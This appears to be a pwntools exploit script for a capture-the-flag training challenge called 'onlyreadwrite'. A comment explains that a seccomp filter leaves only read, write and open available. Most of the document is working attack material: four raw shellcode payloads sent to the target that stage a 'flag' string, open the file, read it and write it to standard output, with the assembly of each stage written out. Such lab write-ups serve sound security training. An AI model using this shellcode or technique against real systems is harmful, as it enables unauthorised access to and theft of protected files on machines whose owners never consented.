from pwn import *

SERVER = "bin.training.offdef.it"
PORT = 2006
BINARY = "./onlyreadwrite"


if "REMOTE" in args:
    r = remote(SERVER, PORT)
else: 
    r = process(BINARY)
    gdb.attach(r, """
            #breakpoints
            b* 0x00401551
            c
            """)
    input("wait")


#code
r.send(b'\x48\x89\xC6\x48\x31\xC0\x48\x31\xFF\x48\xC7\xC2\x00\x02\x00\x00\x0F\x05')
r.send(b'\x90flag\x00\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x48\x89\xF3\x48\x83\xC3\x01\x48\xC7\xC0\x02\x00\x00\x00\x48\x89\xDF\x48\x31\xF6\x48\x31\xD2\x0F\x05\x90')
r.send(b'\x90\x48\x89\xC7\x48\x31\xC0\x48\x89\xDE\x48\xC7\xC2\x30\x00\x00\x00\x0F\x05\x90\x90')
r.send(b'\x48\xC7\xC0\x01\x00\x00\x00\x48\xC7\xC7\x01\x00\x00\x00\x48\x89\xDE\x48\xC7\xC2\x30\x00\x00\x00\x0F\x05\x90\x90')
r.interactive()


#comment
'''
The problem in this challenge was that there was a SECCOM filter for the syscall.
SECCOM is the security protocol for allowing or restricting the system call permission. 
Analyzing the filter is a pain in the ass, so I used the seccomp-tools command "seccomp-tools dump ./onlyreadwrite". 
Basically this command shows which syscall are allowed. After that, you can see that basically
just read, write and open are allowed. So the only way to exploit the code is to make
the binary open the file and printing the flag. In addiction there was an alarm in this challenge
but during the debuggin it was not a problem. You can also handle singnals and ignore them
in gdb. Look at the signals with "info signals" and use the help to understand how to ignore them. 

mov    rsi,rax
xor    rax,rax
xor    rdi,rdi
mov    rdx,0x200
syscall

this first shell code was a simple read, I needed it for one reason only: I had to save
the string 'flag' somewhere in the memory. 
As you can see there is a 'flag' string inside the second shell code, more specifically in the middle of nops. 
After the nop the second shell code (remember that once finished a syscall it jumps at the end of the bytes)
executes an open, using the string 'flag' stored previously. 

mov    rbx,rsi
add    rbx,0x1
mov    rax,0x2
mov    rdi,rbx
xor    rsi,rsi
xor    rdx,rdx
syscall 
(open shell code)

The open, if went good, stores the fd (file descriptor) in the rax register.
What we have to do now is to read form that file descriptor and write to the 
standard output (std_in is 0, std_out is 1), and this is what the third and fourth 
shellcode do. 

mov    rdi,rax
xor    rax,rax
mov    rsi,rbx
mov    rdx,0x30
syscall
(read from the file 0x30 bytes)

mov    rax,0x1
mov    rdi,0x1
mov    rsi,rbx
mov    rdx,0x30
syscall
(write on std_out)

'''